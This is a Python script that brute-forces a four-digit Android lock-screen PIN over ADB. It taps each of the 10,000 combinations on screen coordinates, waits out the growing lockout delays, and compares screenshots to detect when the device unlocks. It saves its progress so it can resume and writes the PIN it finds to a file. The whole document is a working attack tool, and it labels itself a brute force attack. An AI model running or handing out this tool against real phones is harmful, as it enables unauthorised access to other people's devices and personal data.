import io
import itertools
import os
import shutil
import subprocess
import sys
import time
from PIL import Image, ImageChops, ImageStat

ADB_PATH = r"C:\platform-tools\adb.exe"

KEYPAD_COORDS = {
    '1': (166, 900), '2': (366, 857), '3': (554, 866),
    '4': (165, 1053), '5': (355, 1040), '6': (555, 1033),
    '7': (145, 1235), '8': (362, 1216), '9': (545, 1220),
    '0': (360, 1400),
}

PIN_LENGTH = 4            # PIN Length
DIGIT_DELAY = 0.2         # Delay between pressing digits (sec)
ATTEMPT_DELAY = 5         # Base delay after entering a combination
STEP_INCREMENT = 5        # Increase in delay
MAX_DELAY = 31.0          # Maximum delay

DIFF_THRESHOLD = 25.0     # Sensitivity threshold (above this threshold, only a real screen change occurs)
POST_INPUT_SETTLE = 0.5   # Wait time until error/click animations finish

PROGRESS_FILE = "progress.txt"
SUCCESS_FILE = "SUCCESS_PIN.txt"

def check_adb_available() -> bool:
    return bool(shutil.which(ADB_PATH) or os.path.exists(ADB_PATH))


def check_device_connected() -> bool:
    try:
        res = subprocess.run([ADB_PATH, "devices"], capture_output=True, text=True, check=True)
        lines = res.stdout.strip().splitlines()[1:]
        return any("\tdevice" in line for line in lines)
    except (subprocess.SubprocessError, FileNotFoundError):
        return False


def get_screenshot() -> Image.Image | None:
    try:
        res = subprocess.run(
            [ADB_PATH, "exec-out", "screencap", "-p"],
            capture_output=True, check=True
        )
        if res.stdout:
            return Image.open(io.BytesIO(res.stdout)).convert("L")
    except Exception as e:
        print(f"[!] Screen capture error: {e}")
    return None


def calculate_visual_diff(img1: Image.Image, img2: Image.Image) -> float:
    small1 = img1.resize((150, 300))
    small2 = img2.resize((150, 300))
    diff = ImageChops.difference(small1, small2)
    stat = ImageStat.Stat(diff)
    return stat.rms[0]


def enter_pin_optimized(pin_code: str) -> None:
    commands = []
    for digit in pin_code:
        if digit in KEYPAD_COORDS:
            x, y = KEYPAD_COORDS[digit]
            commands.append(f"input tap {x} {y}")

    if commands:
        shell_cmd = " && ".join(commands)
        subprocess.run([ADB_PATH, "shell", shell_cmd], check=True)

def load_progress() -> int:
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
                return int(f.read().strip())
        except (ValueError, OSError):
            return 0
    return 0


def save_progress(index: int) -> None:
    try:
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            f.write(str(index))
    except OSError:
        pass

def main() -> None:

    if not check_adb_available() or not check_device_connected():
        print("\n[ERROR] Device not found.")
        return

    print("[+] The device is connected. Creating a reference image...")
    baseline_image = get_screenshot()
    if not baseline_image:
        print("[ERROR] I was unable to take a reference screenshot.")
        return

    digits = "0123456789"
    all_combinations = list(itertools.product(digits, repeat=PIN_LENGTH))
    total_combos = len(all_combinations)

    start_index = load_progress()
    if start_index > 0:
        print(f"[+] Resuming from the position: {start_index + 1} from {total_combos}")

    print("\nRunning a Secure Brute Force Attack\n")

    for i in range(start_index, total_combos):
        pin = "".join(all_combinations[i])
        print(f"[{i + 1}/{total_combos}] Enter PIN: {pin}")

        # 1. Enter a combination
        try:
            enter_pin_optimized(pin)
        except subprocess.CalledProcessError:
            time.sleep(1.0)
            continue

        # 2. Calculating the base delay + waiting for short animations to finish
        attempt_step = i - start_index
        if attempt_step < 3:
            delay = ATTEMPT_DELAY
        else:
            delay = min(ATTEMPT_DELAY + (STEP_INCREMENT * (attempt_step - 2)), MAX_DELAY)

        time.sleep(delay)

        # 3. First image after injection
        current_image = get_screenshot()
        if current_image:
            diff_score = calculate_visual_diff(baseline_image, current_image)
            print(f"    [DEBUG] Change Index (RMS): {diff_score:.2f}")

            # If the threshold is exceeded, it may be a success or a long animation
            if diff_score > DIFF_THRESHOLD:
                print("    [!] A screen change has been detected. Stability check (animation protection)...")
                
                # Waiting for any transition animations to finish
                time.sleep(POST_INPUT_SETTLE)
                
                # Take a reference (second) photo
                second_image = get_screenshot()
                if second_image:
                    second_diff = calculate_visual_diff(baseline_image, second_image)
                    print(f"    [DEBUG] Repeated Change Index: {second_diff:.2f}")

                    # If the screen has changed permanently (it remains as it is, rather than reverting to its previous state after the error animation)
                    if second_diff > DIFF_THRESHOLD:
                        print("\n" + "=" * 60)
                        print(f"[SUCCESS] The correct PIN has been found: {pin}")
                        print(f"Stable Change Index: {second_diff:.2f}")
                        print("=" * 60)

                        with open(SUCCESS_FILE, "w", encoding="utf-8") as f:
                            f.write(f"Valid PIN: {pin}\nAttempt: {i + 1}\nRMS: {second_diff}\n")

                        sys.stdout.write('\a')
                        sys.stdout.flush()
                        return
                    else:
                        print("    [-] False alarm (error animation complete; back to normal). Continuing...")

        # 4. Preserving Progress
        save_progress(i + 1)

    print("\n[Completed] All combinations have been checked.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[Interrupted by the user]. Progress Saved.")
        sys.exit(0)